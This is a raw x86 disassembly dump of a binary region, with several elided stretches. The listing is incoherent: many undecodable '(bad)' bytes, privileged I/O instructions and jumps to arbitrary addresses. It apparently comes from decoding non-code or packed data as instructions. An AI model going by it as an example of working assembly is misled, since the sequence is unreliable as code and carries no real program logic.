  418842:	cmp    al,0x72
  418844:	jno    0x41882c
  418846:	mov    ds:0xb484bc51,al
  41884b:	test   BYTE PTR [ecx+0x593ddec4],dh
  418851:	imul   edi,DWORD PTR [eax],0x446fb287
  418857:	fild   QWORD PTR [edi]
  418859:	fidiv  DWORD PTR [ecx-0x628be93e]
  41885f:	repz add bh,BYTE PTR [ebx-0x6b]
  418863:	mov    bh,0xd0
  418865:	adc    ch,BYTE PTR [ebx-0x5b2af508]
  41886b:	jnp    0x4187fa
  41886d:	fiadd  DWORD PTR [eax]
	...
  4188d3:	add    BYTE PTR [eax],al
  4188d5:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  4188dc:	hlt    
  4188dd:	fbld   TBYTE PTR [esi-0x1e63c533]
  4188e3:	fdiv   DWORD PTR [edi-0xa]
  4188e6:	or     BYTE PTR [bx+di],al
  4188e9:	add    BYTE PTR [eax],al
  4188eb:	add    DWORD PTR [eax],eax
  4188ed:	add    BYTE PTR [ecx*4-0x65213c6b],ch
  4188f4:	push   0x4e
  4188f6:	rcr    edx,0xbc
  4188f9:	lock mul DWORD PTR [eax+0x29f597f3]
  418900:	sub    ch,dh
  418902:	jmp    0x418913
  418904:	mov    dl,BYTE PTR [ecx-0x417aa045]
  41890a:	rol    BYTE PTR [ebx-0x49],cl
  41890d:	call   0xf6269aee
  418912:	and    bh,al
  418914:	bound  eax,QWORD PTR [eax]
  418916:	dec    eax
  418917:	test   DWORD PTR [ecx+eax*4+0x64],esi
  41891b:	retf   
  41891c:	fmul   QWORD PTR [eax-0x2e69a37e]
  418922:	pop    edx
  418923:	cli    
  418924:	ret    0xbded
  418927:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418928:	pushf  
  418929:	ret    0x54e8
  41892c:	add    al,0xfe
  41892e:	stos   DWORD PTR es:[edi],eax
  41892f:	mov    bh,0x4e
  418931:	and    eax,0x5d52b31
  418936:	out    0xc7,al
  418938:	mov    cl,0x42
  41893a:	pop    ebx
  41893b:	mov    al,ds:0x8ef32b77
  418940:	in     eax,0x21
  418942:	inc    edx
  418943:	adc    esi,DWORD PTR [ebp+0x46]
  418946:	pop    esp
  418947:	lea    esi,[esp+eiz*4]
  41894a:	fidivr DWORD PTR [esi-0x9]
  41894d:	scas   al,BYTE PTR es:[edi]
  41894e:	pop    edx
  41894f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418950:	inc    ebp
  418951:	adc    eax,0x13621262
  418956:	loop   0x41892e
  418958:	fsubr  st,st(2)
  41895a:	in     al,dx
  41895b:	add    al,0xb2
  41895d:	dec    esi
  41895e:	xchg   esp,eax
  41895f:	and    BYTE PTR [ecx],dh
  418961:	(bad)  
  418963:	mov    ebp,0xf78e23a6
  418968:	push   ebx
  418969:	xor    ebp,DWORD PTR [ebp+0x57]
  41896c:	or     esi,esp
  41896e:	mov    edi,0x7351d961
  418973:	and    DWORD PTR [ecx+0x2c700ec9],esi
  418979:	lea    edx,[ebx-0x20]
  41897c:	mov    eax,ds:0x85755402
  418981:	mov    cl,0x45
  418983:	add    ebx,eax
  418985:	ss xchg edi,eax
  418987:	inc    esp
  418988:	adc    al,0xeb
  41898a:	rol    BYTE PTR [edx-0x46],cl
  41898d:	adc    DWORD PTR [ebx+0x1d07ed5f],eax
  418993:	mov    ecx,0xe937083d
  418998:	jbe    0x4189ae
  41899a:	iret   
  41899b:	inc    BYTE PTR [eax+0x63]
  41899e:	dec    ebp
  41899f:	sub    BYTE PTR [edi+0x61a17ff5],cl
  4189a5:	add    edx,DWORD PTR [edx+0x136b27c8]
  4189ab:	out    0x27,eax
  4189ad:	pop    ds
  4189ae:	js     0x418967
  4189b0:	pop    esi
  4189b1:	xor    eax,0xb48e6c93
  4189b6:	mov    bh,0x87
  4189b8:	jnp    0x418952
  4189ba:	sub    edx,0xffffffe5
  4189bd:	push   0xffffffe8
  4189bf:	inc    esi
  4189c0:	mov    dl,0xf2
  4189c2:	neg    ebx
  4189c4:	mov    dl,0x9f
  4189c6:	and    DWORD PTR [ecx],eax
  4189c8:	lds    ebx,FWORD PTR [eax-0x57ecf0ea]
  4189ce:	jb     0x418a04
  4189d0:	je     0x418a1e
  4189d2:	and    ebx,DWORD PTR [esi-0x2c]
  4189d5:	cmp    eax,0x4ca22d8
  4189da:	int    0x59
  4189dc:	ja     0x418a5b
  4189de:	dec    edx
  4189df:	les    ebx,FWORD PTR ds:0x3359926d
  4189e5:	push   edx
  4189e6:	pop    esp
  4189e7:	push   ebx
  4189e8:	sub    DWORD PTR [ecx],0x15b314f9
	...
  418a56:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  418a5c:	into   
  418a5d:	fwait
  418a5e:	add    bh,cl
  418a60:	mov    ebp,0xb03b769
  418a65:	sbb    al,0x67
  418a67:	or     DWORD PTR [ecx],eax
  418a69:	add    BYTE PTR [eax],al
  418a6b:	add    DWORD PTR [eax],eax
  418a6d:	add    BYTE PTR [edi],dl
  418a6f:	loop   0x418a03
  418a71:	pop    ebp
  418a72:	enter  0x5789,0xfe
  418a76:	call   FWORD PTR [edi+0x5d670fcd]
  418a7c:	cmp    ebx,DWORD PTR [esp+edi*2-0x6264a281]
  418a83:	pop    es
  418a84:	mov    BYTE PTR [edi+0x40],ch
  418a87:	es sub esp,DWORD PTR fs:[ebx]
  418a8b:	inc    ebp
  418a8c:	(bad)  
  418a8e:	push   ecx
  418a8f:	imul   esi,eax,0xdd60f813
  418a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a96:	xor    eax,DWORD PTR [esi+eiz*1-0x3c]
  418a9a:	mov    cs,WORD PTR [ecx+0x64]
  418a9d:	xchg   ebp,eax
  418a9e:	mov    ecx,0x3251a377
  418aa3:	into   
  418aa4:	scas   al,BYTE PTR es:[edi]
  418aa5:	mov    ds:0x5d07d2ca,al
  418aaa:	adc    DWORD PTR [eax+0x57b92ece],ebx
  418ab0:	adc    al,0x2b
  418ab2:	push   cs
  418ab3:	aaa    
  418ab4:	daa    
  418ab5:	mov    eax,0x6581218
  418aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418abb:	(bad)  
  418abd:	mov    bl,BYTE PTR [edi]
  418abf:	add    DWORD PTR [ebx],edi
  418ac1:	clc    
  418ac2:	jl     0x418b0e
  418ac4:	(bad)  
  418ac5:	pop    eax
  418ac6:	sahf   
  418ac7:	(bad)  
  418ac8:	in     eax,0x9d
  418aca:	jo     0x418b2c
  418acc:	add    al,0xec
  418ace:	jno    0x418a66
  418ad0:	push   ss
  418ad1:	jo     0x418b19
  418ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ad4:	cld    
  418ad5:	pop    esi
  418ad6:	add    al,0x17
  418ad8:	cmp    esp,DWORD PTR [ebp-0x3d178b92]
  418ade:	mov    eax,?
  418ae0:	sahf   
  418ae1:	xlat   BYTE PTR ds:[ebx]
  418ae2:	push   edx
  418ae3:	in     eax,0xea
  418ae5:	cmp    ecx,DWORD PTR [edx+0x5cf6e612]
  418aeb:	cmp    eax,0x21e8cc42
  418af0:	pop    ds
  418af1:	jl     0x418ae6
  418af3:	cld    
  418af4:	int    0xc6
  418af6:	dec    ebp
  418af7:	or     eax,0xe58abf70
  418afc:	xor    bh,BYTE PTR [ebx+ebx*4+0x23]
  418b00:	adc    al,0x79
  418b02:	lahf   
  418b03:	mov    bh,0xd4
  418b05:	fidiv  WORD PTR [ebp+0x47]
  418b08:	xchg   DWORD PTR [edi-0x6],esi
  418b0b:	scas   eax,DWORD PTR es:[edi]
  418b0c:	push   cs
  418b0d:	jnp    0x418b68
  418b0f:	ds push ebx
  418b11:	jmp    0x418b58
  418b13:	lods   eax,DWORD PTR ds:[esi]
  418b14:	adc    eax,0x42bd88f8
  418b19:	xchg   ecx,eax
  418b1a:	inc    esi
  418b1b:	sti    
  418b1c:	mov    DWORD PTR [ebp+0x6fc8f063],0x73f1fb00
  418b26:	and    esp,DWORD PTR ds:0x260a0d21
  418b2c:	mov    esp,0xbe6e50a8
  418b31:	mov    dh,0xf0
  418b33:	out    dx,al
  418b34:	xlat   BYTE PTR ds:[ebx]
  418b35:	enter  0xa45,0xb6
  418b39:	out    dx,al
  418b3a:	jnp    0x418b94
  418b3c:	and    bl,BYTE PTR [edi+0x77]
  418b3f:	loope  0x418b20
  418b41:	int3   
  418b42:	dec    edx
  418b43:	xchg   DWORD PTR [ebx],esp
  418b45:	or     BYTE PTR [edi+0x61a36a47],ch
  418b4b:	xor    eax,ebx
  418b4d:	push   ss
  418b4e:	or     eax,0xbabd8de8
  418b53:	fldcw  WORD PTR [edx-0x22e40365]
  418b59:	imul   eax,DWORD PTR [ecx],0xb5770c09
  418b5f:	cmp    DWORD PTR [ecx-0x2ff9a5e2],esi
  418b65:	push   es
  418b66:	and    eax,0xc43df8e4
  418b6b:	rol    BYTE PTR [ecx],0xd5
	...
  418bd6:	jl     0x418beb
  418bd8:	test   DWORD PTR [edx],esi
  418bda:	out    dx,eax
  418bdb:	mov    dh,0xff
  418bdd:	pop    edi
  418bde:	sar    BYTE PTR [ebp+0x3b],1
  418be1:	in     eax,0x6d
  418be3:	dec    ecx
  418be4:	ret    
  418be5:	cmp    eax,0x10a67
  418bea:	add    BYTE PTR [ecx],al
  418bec:	add    BYTE PTR [eax],al
  418bee:	xchg   BYTE PTR [eax],ch
  418bf0:	fnstsw WORD PTR [ecx]
  418bf2:	out    0xe1,al
  418bf4:	fs xchg ecx,eax
  418bf6:	dec    edi
  418bf7:	dec    edi
  418bf8:	in     eax,0x3d
  418bfa:	cmp    cl,dh
  418bfc:	mov    ds:0x6f498923,eax
  418c01:	sti    
  418c02:	mov    ebp,0x7d7c989b
  418c07:	or     al,0x11
  418c09:	ret    0x591d
  418c0c:	jecxz  0x418c37
  418c0e:	add    ah,BYTE PTR [ebx+0x33]
  418c11:	lds    esi,FWORD PTR [ebx+0x48]
  418c14:	call   0x9d41c3f9
  418c19:	cmp    DWORD PTR [esi+0x61],ecx
  418c1c:	mov    esi,0x6fbdbfe6
  418c21:	mov    ebx,0xd76199d3
  418c26:	push   0x42
  418c28:	pop    eax
  418c29:	(bad)  
  418c2a:	pusha  
  418c2b:	sbb    edx,esi
  418c2d:	mov    eax,ds:0xfe3640d4
  418c32:	jb     0x418bfa
  418c34:	div    BYTE PTR [ecx-0x33e4fa24]
  418c3a:	inc    eax
  418c3b:	dec    ebx
  418c3c:	inc    ecx
  418c3d:	or     bl,BYTE PTR [edx+0x483d5c00]
  418c43:	popf   
  418c44:	imul   eax,DWORD PTR [ebp-0x12],0x650b733
  418c4b:	js     0x418c6e
  418c4d:	and    ecx,DWORD PTR [ecx]
  418c4f:	shr    BYTE PTR [esi+ebx*1],cl
  418c52:	mov    ds:0x76d2981a,eax
  418c57:	mov    dl,0x14
  418c59:	fild   WORD PTR [eax]
  418c5b:	xchg   ecx,eax
  418c5c:	ds mov cs,esp
  418c5f:	xchg   ch,dh
  418c61:	ja     0x418caf
  418c63:	jne    0x418c56
  418c65:	jecxz  0x418cda
  418c67:	cdq    
  418c68:	jae    0x418bf8
  418c6a:	add    BYTE PTR [ebx+0x1013a4a6],0x26
  418c71:	or     edi,DWORD PTR ds:0x76abe296
  418c77:	ret    
  418c78:	adc    bl,ch
  418c7a:	push   ebx
  418c7b:	mov    ?,WORD PTR [edi]
  418c7d:	pop    esp
  418c7e:	lods   eax,DWORD PTR ds:[esi]
  418c7f:	jnp    0x418c3c
  418c81:	cmp    eax,0xed5fa757
  418c86:	ret    0x9239
  418c89:	mov    ebp,0xfb1266dc
  418c8e:	adc    al,0xe5
  418c90:	sahf   
  418c91:	out    dx,eax
  418c92:	ins    DWORD PTR es:[edi],dx
  418c93:	xchg   esi,eax
  418c94:	repnz mov esi,0x8337492e
  418c9a:	icebp  
  418c9b:	mov    ebx,0x4d27d374
  418ca0:	or     ch,BYTE PTR [ebx]
  418ca2:	push   ebx
  418ca3:	nop
  418ca4:	push   es
  418ca5:	mov    bl,0x93
  418ca7:	mov    bh,0x35
  418ca9:	daa    
  418caa:	ret    
  418cab:	mov    edx,0x5594d1f1
  418cb0:	add    ah,dl
  418cb2:	xor    eax,0xba937c6
  418cb7:	mov    ds:0x78c42c9a,al
  418cbc:	mov    esp,0x9d2f936a
  418cc1:	mov    DWORD PTR [ebx+0x48bb664a],0x49605835
  418ccb:	jmp    0xa6e536f9
  418cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cd1:	lea    ebx,[edx+0x5adb2f1e]
  418cd7:	cmp    DWORD PTR [edx],0xffffffc2
  418cda:	sub    eax,0x879fb3cb
  418cdf:	rcr    DWORD PTR ds:0xcaf47ee2,cl
  418ce5:	fsub   QWORD PTR [ecx+0x20d14888]
  418ceb:	stos   BYTE PTR es:[edi],al
  418cec:	cmp    cl,BYTE PTR ds:0x0
	...
  418d56:	sti    
  418d57:	inc    edx
  418d58:	out    dx,al
  418d59:	aas    
  418d5a:	(bad)  
  418d5b:	mov    edi,0x6a1ac6fb
  418d60:	(bad)  
  418d61:	ror    BYTE PTR [edx],cl
  418d63:	rcl    DWORD PTR [esi+0x2b],1
  418d66:	or     eax,DWORD PTR [bx+di]
  418d69:	add    BYTE PTR [eax],al
  418d6b:	add    DWORD PTR [eax],eax
  418d6d:	add    cl,dl
  418d6f:	imul   BYTE PTR [edi]
  418d71:	jno    0x418d02
  418d73:	mov    esi,0x3ff4cf51
  418d78:	test   al,0x73
  418d7a:	std    
  418d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d7c:	aam    0x49
  418d7e:	call   0xc958:0xcfa58aa1
  418d85:	jg     0x418d54
  418d87:	jno    0x418d0a
  418d89:	push   ss
  418d8a:	cmp    BYTE PTR cs:[ecx+eiz*2],dl
  418d8e:	aas    
  418d8f:	inc    ebp
  418d90:	aam    0xb4
  418d92:	dec    edx
  418d93:	jne    0x418d69
  418d95:	dec    ebx
  418d96:	pop    esp
  418d97:	out    0x2d,al
  418d99:	jl     0x418d47
  418d9b:	mov    BYTE PTR [esp+ebx*2-0x44674504],cl
  418da2:	dec    edx
  418da3:	jecxz  0x418dae
  418da5:	push   ebp
  418da6:	add    ebp,eax
  418da8:	dec    edx
  418da9:	popa   
  418daa:	add    eax,DWORD PTR [ebx+0x7b317b1f]
  418db0:	pop    ss
  418db1:	mov    ebp,0xa2a75f76
  418db6:	jg     0x418e24
  418db8:	xchg   ecx,eax
  418db9:	or     al,0xaa
  418dbb:	cwde   
  418dbc:	outs   dx,BYTE PTR ds:[esi]
  418dbd:	out    0x42,eax
  418dbf:	inc    edx
  418dc0:	mov    ch,0xdd
  418dc2:	es ds mov ecx,0x8ed648a4
  418dc9:	jl     0x418e29
  418dcb:	jns    0x418df2
  418dcd:	and    ebp,DWORD PTR [ebx+0x6a]
  418dd0:	dec    ebp
  418dd1:	mov    ds:0x9e641427,al
  418dd6:	dec    ebx
  418dd7:	test   DWORD PTR [edi+0x31],ebx
  418dda:	inc    ecx
  418ddb:	and    BYTE PTR [edx+eiz*4-0x37d9cc6e],ch
  418de2:	inc    esp
  418de3:	push   esp
  418de4:	daa    
  418de5:	int3   
  418de6:	retf   
  418de7:	sbb    bh,dh
  418de9:	pop    ds
  418dea:	sub    al,0x39
  418dec:	pop    esp
  418ded:	push   cs
  418dee:	dec    ebp
  418def:	xor    al,0x4b
  418df1:	sub    ecx,DWORD PTR [edi-0x2c]
  418df4:	inc    ebx
  418df5:	out    dx,al
  418df6:	jb     0x418e51
  418df8:	mov    dh,BYTE PTR [ebx]
  418dfa:	(bad)  
  418dfb:	js     0x418dcf
  418dfd:	ficomp DWORD PTR [esi-0x25]
  418e00:	sbb    al,0xa7
  418e02:	push   esi
  418e03:	dec    ecx
  418e04:	push   ss
  418e05:	shr    BYTE PTR [esp+ecx*2-0x30],1
  418e09:	hlt    
  418e0a:	adc    eax,0x4cc1a972
  418e0f:	push   cs
  418e10:	sub    BYTE PTR [edx+0x60],cl
  418e13:	loop   0x418d95
  418e15:	bnd jmp 0x418dcb
  418e18:	in     al,0x1f
  418e1a:	xor    al,0x7c
  418e1c:	jl     0x418e4e
  418e1e:	cld    
  418e1f:	mov    fs:0xc84d9c5f,al
  418e25:	dec    DWORD PTR [ebx+0x672be7a8]
  418e2b:	pop    esp
  418e2c:	fsub   QWORD PTR [ecx-0x69]
  418e2f:	sub    ebx,DWORD PTR [edx+0x51]
  418e32:	mov    dh,0xed
  418e34:	add    DWORD PTR [eax-0x73de4eea],ebp
  418e3a:	adc    eax,0xeb1713c0
  418e3f:	mov    BYTE PTR [edi+0x25],bl
  418e42:	enter  0x24cb,0xb2
  418e46:	jo     0x418ec4
  418e48:	out    dx,al
  418e49:	or     DWORD PTR [ecx],0x39
  418e4c:	bound  ebx,QWORD PTR [eax+0x2c]
  418e4f:	inc    ecx
  418e50:	push   ebp
  418e51:	xchg   ecx,eax
  418e52:	rol    ch,0xac
  418e55:	test   al,0xd4
  418e57:	sbb    DWORD PTR [ebp+0x1ba26480],ebx
  418e5d:	loopne 0x418e4d
  418e5f:	outs   dx,BYTE PTR ds:[esi]
  418e60:	mov    ds:0x855e4314,al
  418e65:	call   0xf6bf:0x87d03046
  418e6c:	test   edi,ecx
	...
  418ed6:	push   cs
  418ed7:	bnd call 0xde7c8b0d
  418edd:	dec    dl
  418edf:	leave  
  418ee0:	and    ah,BYTE PTR [edx+0x16]
  418ee3:	xchg   edx,eax
  418ee4:	inc    esi
  418ee5:	aas    
  418ee6:	addr16 or al,0x1
  418ee9:	add    BYTE PTR [eax],al
  418eeb:	add    DWORD PTR [eax],eax
  418eed:	add    BYTE PTR [esi],cl
  418eef:	xchg   esi,eax
  418ef0:	push   esp
  418ef1:	test   BYTE PTR [esi+ecx*2],0xf8
  418ef5:	dec    esp
  418ef6:	fiadd  WORD PTR ds:0x3412883
  418efc:	loopne 0x418ec9
  418efe:	mov    esp,edi
  418f00:	mov    esi,edi
  418f02:	cld    
  418f03:	pusha  
  418f04:	pop    esi
  418f05:	mov    bl,0xcb
  418f07:	bound  esp,QWORD PTR [esi+edx*2+0x3]
  418f0b:	lods   eax,DWORD PTR ds:[esi]
  418f0c:	mov    dh,0xc0
  418f0e:	sti    
  418f0f:	xor    eax,0x454ab246
  418f14:	rcl    BYTE PTR [ecx+edi*2+0x2fede143],cl
  418f1b:	add    al,0x73
  418f1d:	aad    0x91
  418f1f:	or     al,0x12
  418f21:	dec    esp
  418f22:	adc    DWORD PTR [esi+0x69],ebp
  418f25:	dec    esp
  418f26:	xchg   edx,eax
  418f27:	xchg   edi,eax
  418f28:	pop    es
  418f29:	pop    ss
  418f2a:	sub    eax,0xdfa93ed7
  418f2f:	jge    0x418ee5
  418f31:	retf   
  418f32:	gs test eax,0xa4b6d393
  418f38:	stos   DWORD PTR es:[edi],eax
  418f39:	add    ebp,DWORD PTR [ebx+eax*4-0x3a]
  418f3d:	mov    WORD PTR [ebx-0x1a],gs
  418f40:	dec    esi
  418f41:	popf   
  418f42:	add    al,0xb9
  418f44:	in     al,0xe9
  418f46:	cmp    DWORD PTR [ebx+0x2e84f354],ebp
  418f4c:	push   cs
  418f4d:	popa   
  418f4e:	popf   
  418f4f:	xchg   DWORD PTR [ebx-0x7d7c6fa9],eax
  418f55:	sub    al,0x93
  418f57:	in     eax,0xc0
  418f59:	mov    ah,0xa0
  418f5b:	pop    esi
  418f5c:	cdq    
  418f5d:	(bad)  
  418f5e:	ins    BYTE PTR es:[edi],dx
  418f5f:	xor    BYTE PTR [edx],ch
  418f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f62:	jae    0x418f40
  418f64:	jl     0x418fbb
  418f66:	mov    BYTE PTR [ebx-0x24e667dd],cl
  418f6c:	inc    ebx
  418f6d:	and    edi,DWORD PTR [eax-0x46]
  418f70:	rol    BYTE PTR [ecx+0x4c],1
  418f73:	sub    ecx,DWORD PTR [edx+0x5e10a0c2]
  418f79:	add    BYTE PTR [ecx-0x3495c991],dh
  418f7f:	(bad)  
  418f80:	test   al,0x52
  418f82:	sbb    dh,BYTE PTR [edi+0xf2b29ca]
  418f88:	inc    ecx
  418f89:	mov    ?,esp
  418f8b:	push   cs
  418f8c:	or     ebx,DWORD PTR [ebx+0x16]
  418f8f:	mov    esi,esi
  418f91:	sti    
  418f92:	out    0x55,al
  418f94:	out    0x8,al
  418f96:	push   ebx
  418f97:	mov    ecx,0x11b52cb
  418f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f9d:	push   ds
  418f9e:	or     eax,0x5926bb22
  418fa3:	cdq    
  418fa4:	dec    edi
  418fa5:	lea    edi,[edx+0x13897a18]
  418fab:	xor    DWORD PTR [ebx],eax
  418fad:	xchg   dh,cl
  418faf:	loopne 0x419012
  418fb1:	dec    ebp
  418fb2:	mov    ebp,esp
  418fb4:	cmp    BYTE PTR [ebx+0x2f],al
  418fb7:	ins    BYTE PTR es:[edi],dx
  418fb8:	jg     0x418f58
  418fba:	mov    cl,0xa9
  418fbc:	repz mov dh,0x2d
  418fbf:	cwde   
  418fc0:	or     eax,0x504eca84
  418fc5:	ror    BYTE PTR [esi],1
  418fc7:	mov    al,ds:0x50b357c7
  418fcc:	icebp  
  418fcd:	aam    0xa9
  418fcf:	in     al,dx
  418fd0:	repnz div DWORD PTR ds:0xf8cc9156
  418fd7:	out    dx,eax
  418fd8:	loopne 0x418ffa
  418fda:	imul   ebx,DWORD PTR [edx+0x51],0x6
  418fde:	cmp    BYTE PTR [eax-0x5a],bl
  418fe1:	ret    
  418fe2:	cmp    esi,DWORD PTR [edx+0x4c]
  418fe5:	or     DWORD PTR [ebx+0xf7f253a],esi
  418feb:	rcr    BYTE PTR [eax-0x46],cl
	...
  419056:	sbb    al,0x97
  419058:	in     al,0x47
  41905a:	out    dx,eax
  41905b:	ja     0x41901c
  41905d:	fild   WORD PTR [ecx-0x5e150e59]
  419063:	fbstp  TBYTE PTR [esp+eax*4+0x10d67]
  41906a:	add    BYTE PTR [ecx],al
  41906c:	add    BYTE PTR [eax],al
  41906e:	pop    eax
  41906f:	jl     0x419079
  419071:	(bad)  
  419072:	jl     0x41901b
  419074:	push   edx
  419075:	mov    ds:0xd1537bfa,al
  41907a:	retf   
  41907b:	add    al,0x37
  41907d:	sbb    ah,BYTE PTR [ecx]
  41907f:	fadd   DWORD PTR [edx]
  419081:	cwde   
  419082:	mov    cl,dh
  419084:	adc    eax,0x6120f15d
  419089:	or     al,0xf0
  41908b:	sbb    eax,DWORD PTR [ecx-0x67b8c5d3]
  419091:	mov    WORD PTR [edx],cs
  419093:	sbb    al,0x1c
  419095:	xchg   ecx,eax
  419096:	mov    bl,0x86
  419098:	push   esi
  419099:	jb     0x419094
  41909b:	jo     0x4190fe
  41909d:	repz adc bl,ch
  4190a0:	das    
  4190a1:	jmp    0x4190eb
  4190a3:	(bad)  
  4190a4:	daa    
  4190a5:	cmp    eax,0x44f86014
  4190aa:	or     BYTE PTR [edi],ch
  4190ac:	inc    ebx
  4190ad:	(bad)  
  4190b0:	in     eax,0xeb
  4190b2:	ret    
  4190b3:	fild   WORD PTR [esi+0x46]
  4190b6:	addr16 mov bl,0x55
  4190b9:	rcr    eax,cl
  4190bb:	js     0x419069
  4190bd:	imul   ebp,DWORD PTR [edi+0x3d],0xffffff88
  4190c1:	push   ds
  4190c2:	cld    
  4190c3:	pop    ss
  4190c4:	sub    DWORD PTR [edi+edx*4+0x35],edx
  4190c8:	ds hlt 
  4190ca:	(bad)  
  4190cb:	sti    
  4190cc:	or     al,0x8c
  4190ce:	adc    edi,DWORD PTR [edi+0x42]
  4190d1:	outs   dx,DWORD PTR ds:[esi]
  4190d2:	jge    0x4190a5
  4190d4:	xor    DWORD PTR [ebx+ebx*1+0x4212c365],0x15
  4190dc:	imul   ecx,DWORD PTR ds:0xb7e2f95b,0x8d8687a0
  4190e6:	xor    al,BYTE PTR ds:0x8c832b7a
  4190ec:	ins    BYTE PTR es:[edi],dx
  4190ed:	and    eax,0xb5055dc1
  4190f2:	mov    eax,ds:0x77272f5b
  4190f7:	in     eax,0xc4
  4190f9:	sar    ecx,0xd7
  4190fc:	sub    BYTE PTR [esi+0x75],ch
  4190ff:	jmp    0xbd97262
  419104:	sahf   
  419105:	pop    ss
  419106:	imul   esi,ecx,0xbc849b0b
  41910c:	out    dx,eax
  41910d:	es add bl,bl
  419110:	inc    esp
  419111:	cmp    edi,DWORD PTR [ecx+ebx*4+0x30]
  419115:	aam    0x63
  419117:	imul   esp,DWORD PTR es:[ebp-0x154871fe],0x79
  41911f:	jae    0x4190c2
  419121:	jmp    0x4190a6
  419123:	jmp    0x6004:0x47e8eaa2
  41912a:	ins    BYTE PTR es:[edi],dx
  41912b:	sub    eax,0xdb16ea69
  419130:	stos   BYTE PTR es:[edi],al
  419131:	imul   edx,DWORD PTR [ebp+0x6],0xeca00476
  419138:	addr16 lock xchg edi,eax
  41913b:	loopne 0x419132
  41913d:	mov    ah,0xfe
  41913f:	iret   
  419140:	fnstenv [edi]
  419142:	mov    BYTE PTR [ebp-0x19],ah
  419145:	adc    esp,DWORD PTR [esi]
  419147:	push   edi
  419148:	xchg   esp,eax
  419149:	(bad)  
  41914a:	and    al,0x48
  41914c:	mov    ch,0x5
  41914e:	test   al,0x67
  419150:	adc    cl,BYTE PTR [eax]
  419152:	lahf   
  419153:	pop    eax
  419154:	shr    BYTE PTR [eax+0x60],1
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	pop    DWORD PTR [edi]
  41915a:	test   DWORD PTR [ecx-0x135a1766],edi
  419160:	icebp  
  419161:	frstor [eax]
  419163:	dec    edi
  419164:	inc    ebx
  419165:	aam    0xc3
  419167:	cs fwait
  419169:	retf   
  41916a:	jb     0x419114
  41916c:	call   0x0:0xce
	...
  4191d3:	add    BYTE PTR [eax],al
  4191d5:	add    BYTE PTR [edi-0x41bd617b],ch
  4191db:	pop    ebx
  4191dc:	(bad)  
  4191dd:	in     eax,dx
  4191de:	inc    esi
  4191df:	push   0x4d
  4191e1:	or     dl,BYTE PTR [eax+eax*8]
  4191e4:	into   
  4191e5:	gs addr16 push cs
  4191e8:	add    DWORD PTR [eax],eax
  4191ea:	add    BYTE PTR [ecx],al
  4191ec:	add    BYTE PTR [eax],al
  4191ee:	pop    ds
  4191ef:	hlt    
  4191f0:	adc    al,0x5e
  4191f2:	or     al,0x69
  4191f4:	push   edx
  4191f5:	push   0xdbe20b62
  4191fa:	pop    ds
  4191fb:	push   es
  4191fc:	jnp    0x419200
  4191fe:	lahf   
  4191ff:	xchg   BYTE PTR [edi+eiz*1+0x69],dh
  419203:	jecxz  0x41927b
  419205:	and    esp,edi
  419207:	xchg   al,ah
  419209:	inc    ecx
  41920a:	fs cli 
  41920c:	push   0x695ac809
  419211:	(bad)  
  419212:	test   DWORD PTR [ebx+0x15354614],edi
  419218:	xlat   BYTE PTR ds:[ebx]
  419219:	jmp    0xd48a:0xd8bb9170
  419220:	dec    edi
  419221:	dec    dl
  419223:	push   esp
  419224:	and    ebx,DWORD PTR [ebx]
  419226:	cs aad 0xff
  419229:	mov    cl,0x45
  41922b:	sar    BYTE PTR [ecx+edx*1],cl
  41922e:	jb     0x419256
  419230:	adc    eax,0xd069b08d
  419235:	rcl    DWORD PTR ds:0xb224388,cl
  41923b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41923c:	jmp    0x41922c
  41923e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41923f:	cwde   
  419240:	ret    0xa69e
  419243:	daa    
  419244:	les    ecx,FWORD PTR [edi+0x3b]
  419247:	loop   0x419243
  419249:	jg     0x4192b4
  41924b:	ret    0xb35e
  41924e:	mov    al,0x5
  419250:	sub    ah,BYTE PTR [ebx-0x2f]
  419253:	add    eax,0x11d561e4
  419258:	daa    
  419259:	fst    st(2)
  41925b:	cdq    
  41925c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41925d:	cs stos BYTE PTR es:[edi],al
  41925f:	outs   dx,DWORD PTR ds:[esi]
  419260:	dec    ebp
  419261:	je     0x41924a
  419263:	mov    DWORD PTR [edx+0x4591cd62],edi
  419269:	jmp    0xc088a614
  41926e:	in     eax,dx
  41926f:	cmp    DWORD PTR [ecx-0x53],esp
  419272:	shl    DWORD PTR [eax+eax*4+0x6b628c7f],cl
  419279:	pusha  
  41927a:	and    al,0x2c
  41927c:	xchg   ebx,eax
  41927d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41927e:	inc    ebx
  41927f:	push   edi
  419280:	xor    DWORD PTR [ecx+0x14744ee1],0x21
  419287:	(bad)  
  419288:	fcom   DWORD PTR [ebx-0x4d]
  41928b:	(bad)  
  41928c:	cmp    cl,BYTE PTR [ecx]
  41928e:	mov    ebx,0x3208ce63
  419293:	scas   al,BYTE PTR es:[edi]
  419294:	lods   al,BYTE PTR ds:[esi]
  419295:	hlt    
  419296:	and    ebx,ebx
  419298:	test   DWORD PTR [eax+0x4d17fe20],0xc37f1d96
  4192a2:	(bad)  
  4192a3:	cs aad 0xe0
  4192a6:	add    eax,0xb0b1a30d
  4192ab:	loop   0x419272
  4192ad:	ins    BYTE PTR es:[edi],dx
  4192ae:	xchg   DWORD PTR [ecx-0x58f6a7f0],eax
  4192b4:	jb     0x419237
  4192b6:	data16 mov dl,0xdc
  4192b9:	enter  0x3841,0x8b
  4192bd:	stc    
  4192be:	out    0x83,eax
  4192c0:	fimul  DWORD PTR [eax+ebx*4]
  4192c3:	imul   ebp,ebx,0x394a37d4
  4192c9:	jge    0x41929f
  4192cb:	sbb    DWORD PTR ds:0xf2d80a3d,ebx
  4192d1:	int3   
